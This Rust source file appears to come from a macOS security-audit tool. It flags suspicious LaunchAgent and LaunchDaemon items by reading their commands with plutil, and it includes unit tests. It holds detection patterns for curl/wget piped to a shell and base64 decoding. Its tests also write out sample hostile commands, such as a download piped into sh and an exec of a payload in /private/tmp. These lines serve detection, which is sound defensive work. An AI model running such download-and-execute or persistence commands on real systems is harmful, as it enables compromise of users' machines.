//! Persistence check: do any of the LaunchAgent and LaunchDaemon items that
//! run at startup look suspicious?
//!
//! Malware frequently drops a `.plist` into these directories so that it can
//! keep running after a restart. The scan here relies on simple heuristic
//! rules; it is not a definitive verdict but a "take a look" warning.

use super::{Check, Outcome, Severity};
use crate::runner::CommandRunner;
use serde_json::Value;
use std::path::{Path, PathBuf};

pub struct LaunchItems;

/// It is unusual for a program to run from these locations.
/// `/var/folders` holds each user's `$TMPDIR`.
const TEMP_DIRS: [&str; 7] = [
    "/tmp/",
    "/private/tmp/",
    "/var/tmp/",
    "/private/var/tmp/",
    "/var/folders/",
    "/private/var/folders/",
    "/Users/Shared/",
];

/// How many file names we spell out in the detail text at most.
const MAX_LISTED: usize = 5;

impl Check for LaunchItems {
    fn id(&self) -> &'static str {
        "launch-items"
    }
    fn name(&self) -> &'static str {
        "Launch items"
    }
    fn weight(&self) -> u32 {
        10
    }
    fn severity(&self) -> Severity {
        Severity::Medium
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let (plists, unreadable_dirs) = find_plists(&launch_dirs());
        examine(runner, &plists, &unreadable_dirs)
    }
}

/// Inspects the given launch items.
///
/// An item that cannot be read has not been checked, so it never counts
/// toward a clean Pass: a plist that defeats the reader would otherwise be
/// the easiest way to hide from this check.
fn examine(runner: &dyn CommandRunner, plists: &[PathBuf], unreadable_dirs: &[PathBuf]) -> Outcome {
    const ADVICE_SUSPICIOUS: &str =
        "Review the items you don't recognize; if unneeded, remove the corresponding .plist file.";
    const ADVICE_UNREADABLE: &str = "These items were not checked. Inspect them yourself with `plutil -p <file>`; \
         a launch item that cannot be read is worth a look in itself.";

    let mut suspicious: Vec<String> = Vec::new();
    // Names of the items (and directories) that could not be inspected.
    let mut unreadable: Vec<String> = unreadable_dirs.iter().map(|dir| dir.display().to_string()).collect();
    let mut first_error: Option<String> = None;

    for path in plists {
        let file = path.file_name().unwrap_or_default().to_string_lossy().into_owned();
        match read_command(runner, &path.to_string_lossy()) {
            Ok(command) => {
                if let Some(reason) = suspicion(&command) {
                    suspicious.push(format!("{file} ({reason})"));
                }
            }
            Err(err) => {
                first_error.get_or_insert(err);
                unreadable.push(file);
            }
        }
    }

    let total = plists.len() + unreadable_dirs.len();
    let examined = total - unreadable.len();

    if !suspicious.is_empty() {
        let mut detail = format!("Suspicious items: {}.", suspicious.join(", "));
        if !unreadable.is_empty() {
            detail.push_str(&format!(" Could not be read: {}.", listed(&unreadable)));
        }
        return Outcome::warn(detail, ADVICE_SUSPICIOUS);
    }

    if unreadable.is_empty() {
        return Outcome::pass(format!("{examined} items examined, none suspicious."));
    }

    if examined == 0 {
        // Nothing at all could be read: most likely `plutil` itself is the
        // problem, so there is no finding, only a missing answer.
        let reason = first_error.unwrap_or_else(|| "the directory is not readable".to_string());
        return Outcome::unknown(format!("None of the {total} launch items could be read ({reason})."));
    }

    Outcome::warn(
        format!(
            "{} of {total} launch items could not be read: {}. Nothing suspicious in the other {examined}.",
            unreadable.len(),
            listed(&unreadable),
        ),
        ADVICE_UNREADABLE,
    )
}

/// Joins names for the detail text, cutting a long list short.
fn listed(names: &[String]) -> String {
    let mut text = names
        .iter()
        .take(MAX_LISTED)
        .map(String::as_str)
        .collect::<Vec<_>>()
        .join(", ");
    if names.len() > MAX_LISTED {
        text.push_str(&format!(" and {} more", names.len() - MAX_LISTED));
    }
    text
}

/// Reads the command a launch item runs: the `Program` key followed by the
/// `ProgramArguments` array. An item that defines neither gives an empty list.
///
/// Only the two keys we need are extracted. Converting the whole plist to
/// JSON (`plutil -convert json`) fails as soon as the file contains a
/// `<data>` or `<date>` value anywhere, which a malicious item could add on
/// purpose. `plutil -extract` does not modify the file (`-o -` writes the
/// result to stdout).
fn read_command(runner: &dyn CommandRunner, path: &str) -> Result<Vec<String>, String> {
    let program = extract(runner, "Program", "raw", path)?;
    let arguments = extract(runner, "ProgramArguments", "json", path)?;

    if program.is_none() && arguments.is_none() {
        // `plutil -extract` reports a file it cannot parse exactly like a
        // missing key, so make sure this really is a plist without a command.
        let lint = runner.run("plutil", &["-lint", path])?;
        if !lint.success {
            return Err("not a valid property list".to_string());
        }
        return Ok(Vec::new());
    }

    let mut command: Vec<String> = Vec::new();
    command.extend(program);
    if let Some(json) = arguments {
        let values: Vec<Value> =
            serde_json::from_str(&json).map_err(|_| "ProgramArguments is not a list".to_string())?;
        for value in values {
            match value {
                Value::String(argument) => command.push(argument),
                _ => return Err("ProgramArguments contains an entry that is not text".to_string()),
            }
        }
    }
    Ok(command)
}

/// Extracts one top-level key. `Ok(None)` means the key does not exist;
/// `Err` means the value could not be read at all.
fn extract(runner: &dyn CommandRunner, key: &str, format: &str, path: &str) -> Result<Option<String>, String> {
    let out = runner.run("plutil", &["-extract", key, format, "-o", "-", path])?;
    if out.success {
        return Ok(Some(out.stdout));
    }
    let message = out.combined();
    if message.contains("No value at that key path") {
        Ok(None)
    } else if message.is_empty() {
        Err(format!("plutil could not read `{key}`"))
    } else {
        // plutil prefixes its messages with the full path; the caller
        // already names the file.
        let reason = message.rsplit_once(": ").map_or(message.as_str(), |(_, reason)| reason);
        Err(format!("`{key}`: {reason}"))
    }
}

/// The directories to scan: the system-wide ones and those of the current user.
fn launch_dirs() -> Vec<PathBuf> {
    let mut dirs = vec![
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    if let Some(home) = std::env::var_os("HOME") {
        dirs.push(Path::new(&home).join("Library/LaunchAgents"));
    }
    dirs
}

/// Collects the `.plist` files in the directories in sorted order.
///
/// A directory that does not exist is skipped (it simply has no items). A
/// directory that exists but cannot be listed is returned in the second
/// list, so that it is reported instead of silently counting as empty.
fn find_plists(dirs: &[PathBuf]) -> (Vec<PathBuf>, Vec<PathBuf>) {
    let mut plists: Vec<PathBuf> = Vec::new();
    let mut unreadable: Vec<PathBuf> = Vec::new();

    for dir in dirs {
        match std::fs::read_dir(dir) {
            Ok(entries) => plists.extend(
                entries
                    .filter_map(Result::ok)
                    .map(|entry| entry.path())
                    .filter(|path| path.extension().is_some_and(|ext| ext == "plist")),
            ),
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
            Err(_) => unreadable.push(dir.clone()),
        }
    }

    plists.sort();
    (plists, unreadable)
}

/// Returns the reason if a launch item's command looks suspicious.
///
/// `command` is the program followed by its arguments. Every element is
/// examined, not just the first: `/bin/sh /tmp/x.sh` and
/// `python3 ~/.hidden/agent.py` run a trusted interpreter, but the code that
/// actually executes is the script.
fn suspicion(command: &[String]) -> Option<&'static str> {
    let program = command.first()?;
    let joined = command.join(" ");

    if in_temp_dir(program) {
        return Some("runs from a temporary/shared directory");
    }
    if in_hidden_dir(program) {
        return Some("runs from a hidden directory");
    }

    let downloads = joined.contains("curl ") || joined.contains("wget ");
    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
        .iter()
        .any(|pattern| joined.contains(pattern));
    if downloads && pipes_to_shell {
        return Some("directly runs a script it downloads");
    }
    if joined.contains("base64") && (joined.contains(" -d") || joined.contains("--decode")) {
        return Some("runs a command obfuscated with base64");
    }

    let argument_paths: Vec<&str> = command[1..].iter().flat_map(|argument| paths_in(argument)).collect();
    if argument_paths.iter().any(|path| in_temp_dir(path)) {
        return Some("is given a path in a temporary/shared directory");
    }
    if argument_paths.iter().any(|path| in_hidden_dir(path)) {
        return Some("is given a path in a hidden directory");
    }
    None
}

fn in_temp_dir(path: &str) -> bool {
    TEMP_DIRS.iter().any(|dir| path.starts_with(dir))
}

/// A path component that starts with a dot, such as "/Users/x/.hidden/tool".
fn in_hidden_dir(path: &str) -> bool {
    path.split('/').any(|part| part.starts_with('.') && part.len() > 1)
}

/// The file-system paths mentioned in an argument.
///
/// An argument may be a bare path, an option with a value (`--config=/x/y`),
/// a `PATH`-style list or a whole shell command line (`sh -c "..."`), so it
/// is split at the characters that separate words in those forms. URLs are
/// not paths and are left out.
fn paths_in(argument: &str) -> impl Iterator<Item = &str> {
    const SEPARATORS: [char; 10] = ['"', '\'', '=', ';', '|', '&', '(', ')', '<', '>'];
    argument
        .split(|c: char| c.is_whitespace() || SEPARATORS.contains(&c))
        .filter(|word| !word.contains("://"))
        .flat_map(|word| word.split(':'))
        .filter(|piece| piece.starts_with('/') || piece.starts_with('~'))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::Status;
    use crate::runner::MockRunner;

    /// plutil's answer for a key that is not in the plist.
    const NO_KEY: &str = "x.plist: Could not extract value, error: No value at that key path or invalid key path: Key";

    fn command(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|part| part.to_string()).collect()
    }

    fn program_cmd(path: &str) -> String {
        format!("plutil -extract Program raw -o - {path}")
    }

    fn arguments_cmd(path: &str) -> String {
        format!("plutil -extract ProgramArguments json -o - {path}")
    }

    /// A mock in which `path` is a plist with only `ProgramArguments`.
    fn with_arguments(runner: MockRunner, path: &str, json: &str) -> MockRunner {
        runner.fail(&program_cmd(path), NO_KEY).ok(&arguments_cmd(path), json)
    }

    #[test]
    fn ordinary_app_is_not_suspicious() {
        let ordinary = command(&["/Applications/Cloudflare WARP.app/Contents/Resources/CloudflareWARP"]);
        assert_eq!(suspicion(&ordinary), None);

        let with_options = command(&[
            "/usr/local/bin/tool",
            "--port=8080",
            "--url",
            "https://example.com/.well-known/x",
            "--log",
            "/var/log/tool.log",
        ]);
        assert_eq!(suspicion(&with_options), None);
    }

    #[test]
    fn running_from_temp_dir_is_suspicious() {
        assert_eq!(
            suspicion(&command(&["/tmp/updater"])),
            Some("runs from a temporary/shared directory")
        );
        assert!(suspicion(&command(&["/Users/Shared/helper", "--daemon"])).is_some());
        // The per-user temporary directory ($TMPDIR).
        assert!(suspicion(&command(&["/private/var/folders/x1/abcd/T/updater"])).is_some());
        assert!(suspicion(&command(&["/bin/sh", "/var/folders/x1/abcd/T/run.sh"])).is_some());
    }

    #[test]
    fn hidden_dir_is_suspicious() {
        assert_eq!(
            suspicion(&command(&["/Users/alice/.cache/agent"])),
            Some("runs from a hidden directory")
        );
    }

    #[test]
    fn interpreter_with_script_in_temp_or_hidden_dir_is_suspicious() {
        // The program itself is a trusted system binary; the script is not.
        assert_eq!(
            suspicion(&command(&["/bin/sh", "/tmp/x.sh"])),
            Some("is given a path in a temporary/shared directory")
        );
        assert_eq!(
            suspicion(&command(&["python3", "~/.hidden/agent.py"])),
            Some("is given a path in a hidden directory")
        );
        // Not only the second element, and not only bare paths.
        assert!(suspicion(&command(&["/usr/bin/python3", "-u", "/Users/Shared/a.py"])).is_some());
        assert!(suspicion(&command(&["/bin/sh", "-c", "exec '/private/tmp/payload' --quiet"])).is_some());
        assert!(suspicion(&command(&["/usr/bin/env", "PATH=/usr/bin:/var/tmp/bin", "tool"])).is_some());
        assert!(suspicion(&command(&["/usr/bin/tool", "--config=/Users/bob/.cfg/run.json"])).is_some());
    }

    #[test]
    fn download_and_run_is_suspicious() {
        let downloader = command(&["/bin/sh", "-c", "curl -s http://example.com/x | sh"]);
        assert_eq!(suspicion(&downloader), Some("directly runs a script it downloads"));
    }

    #[test]
    fn item_without_command_is_skipped() {
        assert_eq!(suspicion(&[]), None);
    }

    #[test]
    fn reads_program_and_arguments() {
        let path = "/Library/LaunchDaemons/a.plist";
        let runner = MockRunner::new()
            .ok(&program_cmd(path), "/usr/local/bin/tool")
            .ok(&arguments_cmd(path), r#"["tool","--flag","a \"b\""]"#);
        assert_eq!(
            read_command(&runner, path).unwrap(),
            ["/usr/local/bin/tool", "tool", "--flag", "a \"b\""]
        );
    }

    #[test]
    fn plist_with_data_or_date_values_is_still_inspected() {
        // Such a plist makes `plutil -convert json` fail; extracting only
        // the keys we need works, so the item cannot hide this way.
        let path = "/Library/LaunchAgents/evil.plist";
        let runner = with_arguments(MockRunner::new(), path, r#"["\/bin\/sh","\/tmp\/x.sh"]"#).fail(
            &format!("plutil -convert json -o - {path}"),
            "evil.plist: Invalid object in plist for JSON format",
        );
        let outcome = examine(&runner, &[PathBuf::from(path)], &[]);
        assert_eq!(outcome.status, Status::Warn);
        assert!(outcome.detail.contains("evil.plist"), "{}", outcome.detail);
        assert!(outcome.detail.contains("temporary"), "{}", outcome.detail);
    }

    #[test]
    fn clean_items_pass() {
        let a = "/Library/LaunchAgents/a.plist";
        let b = "/Library/LaunchAgents/b.plist";
        let runner = with_arguments(MockRunner::new(), a, r#"["\/usr\/local\/bin\/a"]"#)
            // An item with no command at all, confirmed to be a valid plist.
            .fail(&program_cmd(b), NO_KEY)
            .fail(&arguments_cmd(b), NO_KEY)
            .ok(&format!("plutil -lint {b}"), "b.plist: OK");
        let outcome = examine(&runner, &[PathBuf::from(a), PathBuf::from(b)], &[]);
        assert_eq!(outcome.status, Status::Pass);
        assert!(outcome.detail.contains("2 items examined"), "{}", outcome.detail);

        assert_eq!(examine(&MockRunner::new(), &[], &[]).status, Status::Pass);
    }

    #[test]
    fn unreadable_item_is_never_a_clean_pass() {
        let good = "/Library/LaunchAgents/good.plist";
        let bad = "/Library/LaunchAgents/bad.plist";
        let both = [PathBuf::from(good), PathBuf::from(bad)];
        let clean = || with_arguments(MockRunner::new(), good, r#"["\/usr\/local\/bin\/a"]"#);

        // plutil fails outright on one item.
        let failing = clean()
            .fail(
                &program_cmd(bad),
                "bad.plist: Property List error: Unexpected character",
            )
            .fail(
                &arguments_cmd(bad),
                "bad.plist: Property List error: Unexpected character",
            );
        let outcome = examine(&failing, &both, &[]);
        assert_eq!(outcome.status, Status::Warn);
        assert!(outcome.detail.contains("1 of 2"), "{}", outcome.detail);
        assert!(outcome.detail.contains("bad.plist"), "{}", outcome.detail);
        assert!(!outcome.advice.is_empty());

        // A corrupt file looks like "no such key" to `-extract`; lint catches it.
        let corrupt = clean()
            .fail(&program_cmd(bad), NO_KEY)
            .fail(&arguments_cmd(bad), NO_KEY)
            .fail(
                &format!("plutil -lint {bad}"),
                "bad.plist: Unexpected character g at line 1",
            );
        assert_eq!(examine(&corrupt, &both, &[]).status, Status::Warn);

        // ProgramArguments of the wrong shape.
        let odd = clean()
            .fail(&program_cmd(bad), NO_KEY)
            .ok(&arguments_cmd(bad), r#"["\/bin\/sh", 42]"#);
        assert_eq!(examine(&odd, &both, &[]).status, Status::Warn);

        // plutil hangs (times out) on one item.
        let hung = clean().error(&program_cmd(bad), "`plutil` did not finish within 20 seconds");
        assert_eq!(examine(&hung, &both, &[]).status, Status::Warn);

        // A launch directory that exists but cannot be listed.
        let outcome = examine(&clean(), &both[..1], &[PathBuf::from("/Library/LaunchDaemons")]);
        assert_eq!(outcome.status, Status::Warn);
        assert!(outcome.detail.contains("/Library/LaunchDaemons"), "{}", outcome.detail);
    }

    #[test]
    fn nothing_readable_is_unknown() {
        // plutil is missing or broken: every command errors.
        let both = [
            PathBuf::from("/Library/LaunchAgents/a.plist"),
            PathBuf::from("/Library/LaunchAgents/b.plist"),
        ];
        let outcome = examine(&MockRunner::new(), &both, &[]);
        assert_eq!(outcome.status, Status::Unknown);
        assert!(outcome.detail.contains("None of the 2"), "{}", outcome.detail);
    }

    #[test]
    fn suspicious_item_is_reported_alongside_unreadable_ones() {
        let evil = "/Library/LaunchAgents/evil.plist";
        let bad = "/Library/LaunchAgents/bad.plist";
        let runner = with_arguments(MockRunner::new(), evil, r#"["\/tmp\/updater"]"#);
        let outcome = examine(&runner, &[PathBuf::from(bad), PathBuf::from(evil)], &[]);
        assert_eq!(outcome.status, Status::Warn);
        assert!(outcome.detail.contains("evil.plist (runs from"), "{}", outcome.detail);
        assert!(
            outcome.detail.contains("Could not be read: bad.plist"),
            "{}",
            outcome.detail
        );
    }

    #[test]
    fn long_lists_are_cut_short() {
        let names: Vec<String> = (1..=8).map(|n| format!("{n}.plist")).collect();
        assert_eq!(listed(&names), "1.plist, 2.plist, 3.plist, 4.plist, 5.plist and 3 more");
        assert_eq!(listed(&names[..2]), "1.plist, 2.plist");
    }

    #[test]
    fn only_plist_files_are_collected() {
        let dir = std::env::temp_dir().join(format!("swordcheck-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("b.plist"), "").unwrap();
        std::fs::write(dir.join("a.plist"), "").unwrap();
        std::fs::write(dir.join("not.txt"), "").unwrap();
        // Exists but is not a directory, so it cannot be listed.
        let not_a_dir = dir.join("not.txt");

        let (found, unreadable) = find_plists(&[dir.clone(), dir.join("missing"), not_a_dir.clone()]);
        std::fs::remove_dir_all(&dir).unwrap();

        let names: Vec<_> = found
            .iter()
            .map(|path| path.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, ["a.plist", "b.plist"]);
        assert_eq!(unreadable, [not_a_dir], "a missing directory is not an error");
    }
}
